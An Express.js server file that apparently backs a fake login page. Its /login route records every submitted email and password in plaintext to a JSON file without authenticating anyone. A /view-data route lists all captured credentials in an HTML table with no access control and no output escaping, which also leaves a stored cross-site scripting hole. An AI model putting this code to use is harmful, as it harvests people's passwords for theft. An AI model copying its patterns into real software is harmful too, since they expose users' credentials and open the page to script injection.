const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public')); // for your HTML login page

// Handle login POST request
app.post('/login', (req, res) => {
    const { email, password } = req.body;

    // Load existing data
    const filePath = path.join(__dirname, 'data.json');
    let data = [];

    if (fs.existsSync(filePath)) {
        const fileData = fs.readFileSync(filePath);
        data = JSON.parse(fileData);
    }

    // Add new login
    data.push({ email, password });

    // Save updated data
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));

    res.json({ message: 'Login data stored successfully!' });
});

// ✅ NEW: View login data in a table
app.get('/view-data', (req, res) => {
    const filePath = path.join(__dirname, 'data.json');

    if (!fs.existsSync(filePath)) {
        return res.send('<p>No data found yet.</p>');
    }

    const fileData = fs.readFileSync(filePath);
    const data = JSON.parse(fileData);

    const rows = data.map(d => `<tr><td>${d.email}</td><td>${d.password}</td></tr>`).join('');

    const html = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Login Data</title>
      <style>
        body { font-family: sans-serif; padding: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ccc; padding: 10px; }
        th { background-color: #f2f2f2; }
      </style>
    </head>
    <body>
      <h2>Stored Login Data</h2>
      <table>
        <thead><tr><th>Email</th><th>Password</th></tr></thead>
        <tbody>${rows}</tbody>
      </table>
    </body>
    </html>
  `;

    res.send(html);
});

app.listen(PORT, () => {
    console.log(`Server is running at http://localhost:${PORT}`);
});
